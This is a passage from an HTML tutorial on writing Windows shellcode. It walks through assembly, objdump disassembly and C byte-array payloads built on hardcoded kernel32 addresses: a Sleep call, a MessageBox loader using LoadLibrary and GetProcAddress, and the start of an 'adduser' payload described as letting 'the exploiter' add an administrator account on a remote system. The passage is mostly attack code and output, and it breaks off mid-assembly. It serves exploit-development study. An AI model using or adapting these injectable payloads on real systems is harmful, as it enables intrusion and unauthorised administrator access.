 8048080:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 31 c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
 8048082:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bb ea 1b e6 77&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x77e61bea,%ebx
 8048087:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 66 b8 88 13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x1388,%ax
 804808b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %eax
 804808c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ff d3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%ebx

</font><font size="3" face="Courier New">Replace the code at the top with:</font><font face="Courier New">
<b>char code[] = </b></font><b><font face="Courier New">"\x31\xc0\xbb\xea\x1b\xe6\x77\x66\xb8\x88\x13\x50\xff\xd3";</font></b>
</pre>
<p><font face="Courier New">When this code is inserted it will cause the parent thread to suspend for 
five seconds (note: it will then probably crash because the 
stack is smashed at this point :-D).</font></p>

<p>&nbsp;</p>

<h4><font face="Courier New"><a name="win32ex2">Example 2 - A Message to say "Hey"</a></font></h4>
<p>
	<font face="Courier New">&nbsp;&nbsp;&nbsp; This second example is 
useful in the fact that it will show a shellcoder how to do several 
things within the bounds of windows shellcoding. Although this example 
does nothing more than pop up a message box and say "hey", it 
demonstrates absolute addressing as well as the dynamic addressing using
 LoadLibrary and GetProcAddress. The library functions we will be using 
are LoadLibraryA, GetProcAddress, MessageBoxA, and ExitProcess (note: 
the A after the function name specifies we will be using a normal 
character set, as opposed to a W which would signify a wide character 
set; such as unicode). Let's load up arwin and find the addresses we 
need to use. We will not retrieve the address of MessageBoxA at this 
time, we will dynamically load that address.</font></p>

<pre><font face="Courier New">G:\&gt;<b>arwin kernel32.dll LoadLibraryA</b>
arwin - win32 address resolution program - by steve hanna - v.01
LoadLibraryA is located at <b>0x77e7d961</b> in kernel32.dll

G:\&gt;<b>arwin kernel32.dll GetProcAddress</b>
arwin - win32 address resolution program - by steve hanna - v.01
GetProcAddress is located at <b>0x77e7b332</b> in kernel32.dll

G:\&gt;<b>arwin kernel32.dll ExitProcess</b>
arwin - win32 address resolution program - by steve hanna - v.01
ExitProcess is located at <b>0x77e798fd</b> in kernel32.dll
</font>
</pre>
<hr>
<pre><font face="Courier New"><i>;msgbox.asm </i>
[SECTION .text]

global _start


_start:
	;eax holds return value
	;ebx will hold function addresses
	;ecx will hold string pointers
	;edx will hold NULL

	
	xor eax,eax
	xor ebx,ebx			;zero out the registers
	xor ecx,ecx
	xor edx,edx
	
	jmp short GetLibrary
LibraryReturn:
	pop ecx				;get the library string
	mov [ecx + 10], dl		;insert NULL
	mov ebx, 0x77e7d961		;LoadLibraryA(libraryname);
	push ecx			;beginning of user32.dll
	call ebx			;eax will hold the module handle

	jmp short FunctionName
FunctionReturn:

	pop ecx				;get the address of the Function string
	xor edx,edx
	mov [ecx + 11],dl		;insert NULL
	push ecx
	push eax
	mov ebx, 0x77e7b332		;GetProcAddress(hmodule,functionname);
	call ebx			;eax now holds the address of MessageBoxA
	
	jmp short Message
MessageReturn:
	pop ecx				;get the message string
	xor edx,edx			
	mov [ecx+3],dl			;insert the NULL

	xor edx,edx
	
	push edx			;MB_OK
	push ecx			;title
	push ecx			;message
	push edx			;NULL window handle
	
	call eax			;MessageBoxA(windowhandle,msg,title,type); Address

ender:
	xor edx,edx
	push eax			
	mov eax, 0x77e798fd 		;exitprocess(exitcode);
	call eax			;exit cleanly so we don't crash the parent program
	

	;the N at the end of each string signifies the location of the NULL
	;character that needs to be inserted
	
GetLibrary:
	call LibraryReturn
	db 'user32.dllN'
FunctionName
	call FunctionReturn
	db 'MessageBoxAN'
Message
	call MessageReturn
	db 'HeyN'


</font>


</pre>
<hr>
<pre><font face="Courier New">[steve hanna@1337b0x]$ <b>nasm -f elf msgbox.asm; ld -o msgbox msgbox.o; objdump -d msgbox</b>

msgbox:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;:
&nbsp;8048080:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048082:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 db</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ebx,%ebx
&nbsp;8048084:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c9</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ecx,%ecx
&nbsp;8048086:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 d2</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %edx,%edx</font></pre>
<pre><font face="Courier New">&nbsp;8048088:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>eb 37&nbsp;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 80480c1 <getlibrary>

0804808a <libraryreturn>:
&nbsp;804808a:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>59</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %ecx
&nbsp;804808b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>88 51 0a&nbsp;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %dl,0xa(%ecx)
&nbsp;804808e:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>bb 61 d9 e7 77</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x77e7d961,%ebx
&nbsp;8048093:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>51</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ecx
&nbsp;8048094:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>ff d3&nbsp;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%ebx
&nbsp;8048096:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>eb 39</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 80480d1 <functionname>

08048098 <functionreturn>:
&nbsp;8048098:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>59</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %ecx
&nbsp;8048099:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 d2</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %edx,%edx
&nbsp;804809b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>88 51 0b</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %dl,0xb(%ecx)
&nbsp;804809e:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>51</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ecx
&nbsp;804809f:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>50</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %eax
&nbsp;80480a0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>bb 32 b3 e7 77</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x77e7b332,%ebx
&nbsp;80480a5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>ff d3&nbsp;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%ebx
&nbsp;80480a7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b> eb 39</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 80480e2 <message>

080480a9 <messagereturn>:
&nbsp;80480a9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>59</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480aa:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 d2</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %edx,%edx
&nbsp;80480ac:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>88 51 03</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %dl,0x3(%ecx)
&nbsp;80480af:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 d2</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %edx,%edx
&nbsp;80480b1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>52</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edx
&nbsp;80480b2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>51</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ecx
&nbsp;80480b3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>51</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %ecx
&nbsp;80480b4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>52</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %edx
&nbsp;80480b5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>ff d0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%eax

080480b7 <ender>:
&nbsp;80480b7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 d2</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %edx,%edx
&nbsp;80480b9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>50</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %eax
&nbsp;80480ba:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b8 fd 98 e7 77</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x77e798fd,%eax
&nbsp;80480bf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>ff d0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; *%eax

080480c1 <getlibrary>:
&nbsp;80480c1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>e8 c4 ff ff ff</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 804808a <libraryreturn>
&nbsp;80480c6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>75 73</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp; 804813b <message+0x59>
&nbsp;80480c8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480c9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>72 33</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jb&nbsp;&nbsp;&nbsp;&nbsp; 80480fe <message+0x1c>
&nbsp;80480cb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>32 2e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; (%esi),%ch
&nbsp;80480cd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>64</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fs
&nbsp;80480ce:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6c</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; insb&nbsp;&nbsp; (%dx),%es:(%edi)
&nbsp;80480cf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6c</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; insb&nbsp;&nbsp; (%dx),%es:(%edi)
&nbsp;80480d0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %esi

080480d1 <functionname>:
&nbsp;80480d1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>e8 c2 ff ff ff</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 8048098 <functionreturn>
&nbsp;80480d6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4d</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %ebp
&nbsp;80480d7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480d8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>73 73</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jae&nbsp;&nbsp;&nbsp; 804814d <message+0x6b>
&nbsp;80480da:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>61</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popa&nbsp;&nbsp;
&nbsp;80480db:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>67</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr16
&nbsp;80480dc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480dd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>42</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %edx
&nbsp;80480de:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>6f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outsl&nbsp; %ds:(%esi),(%dx)
&nbsp;80480df:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>78 41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; js&nbsp;&nbsp;&nbsp;&nbsp; 8048122 <message+0x40>
&nbsp;80480e1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>4e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %esi

080480e2 <message>:
&nbsp;80480e2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>e8 c2 ff ff ff</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 80480a9 <messagereturn>
&nbsp;80480e7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>48</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp; %eax
&nbsp;80480e8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>65</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gs
&nbsp;80480e9:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>79 4e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jns&nbsp;&nbsp;&nbsp; 8048139 <message+0x57>
&nbsp;</message+0x57></messagereturn></message></message+0x40></message+0x6b></functionreturn></functionname></message+0x1c></message+0x59></libraryreturn></getlibrary></ender></messagereturn></message></functionreturn></functionname></libraryreturn></getlibrary></font></pre>
<pre><font size="3" face="Courier New">Replace the code at the top with:</font><font face="Courier New">
<b>char code[] =&nbsp;&nbsp; "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb\x61\xd9"\
		"\xe7\x77\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x32"\
		"\xb3\xe7\x77\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x03\x31\xd2\x52\x51"\
		"\x51\x52\xff\xd0\x31\xd2\x50\xb8\xfd\x98\xe7\x77\xff\xd0\xe8\xc4\xff"\
		"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"\
		"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"\
		"\xff\x48\x65\x79\x4e";</b>
</font>
</pre>

<p><font face="Courier New">This example, while not useful in the fact 
that it only pops up a message box, illustrates several important 
concepts when using windows shellcoding. Static addressing as used in 
most of the example above can be a powerful (and easy) way to whip up 
working shellcode within minutes. This example shows the process of 
ensuring that certain DLLs are loaded into a process space. Once the 
address of the MessageBoxA function is obtained ExitProcess is called to
 make sure that the program ends without crashing.</font></p>

<p>&nbsp;</p>

<h4><font face="Courier New"><a name="win32ex3">Example 3 - Adding an Administrative Account</a></font></h4>
<p>
	<font face="Courier New">&nbsp;&nbsp;&nbsp; This third example is 
actually quite a bit  simpler than the previous shellcode, but this code
 allows the exploiter to add a user to the remote system and give that 
user administrative privileges. This code does not require the loading 
of extra libraries into the process space because the only functions we 
will be using are WinExec and ExitProcess. Note: the idea for this code 
was taken from the Metasploit project mentioned above. The difference 
between the shellcode is that this code is quite a bit smaller than its 
counterpart, and it can be made even smaller by removing the ExitProcess
 function!</font></p>

<pre><font face="Courier New">G:\&gt;<b>arwin kernel32.dll ExitProcess</b>
arwin - win32 address resolution program - by steve hanna - v.01
ExitProcess is located at <b>0x77e798fd</b> in kernel32.dll

G:\&gt;<b>arwin kernel32.dll WinExec</b>
arwin - win32 address resolution program - by steve hanna - v.01
WinExec is located at <b>0x77e6fd35</b> in kernel32.dll
</font>
</pre>
<hr>
<pre><font face="Courier New">;<i>adduser.asm</i>
[Section .text]

global _start

_start:

jmp short GetCommand

CommandReturn:
&nbsp;&nbsp;&nbsp; 	&nbsp;pop ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	;ebx now holds the handle to the string
&nbsp;&nbsp;&nbsp;	&nbsp;xor eax,eax
&nbsp;&nbsp;&nbsp;	&nbsp;push eax
&nbsp;&nbsp;&nbsp; 	&nbsp;xor eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	;for some reason the registers can be very volatile, did this just in case
&nbsp;&nbsp;	&nbsp;mov [ebx + 89],al&nbsp;&nbsp; 	;insert the NULL character
&nbsp;&nbsp;	&nbsp;push ebx
&nbsp;&nbsp;	&nbsp;mov ebx,0x77e6fd35
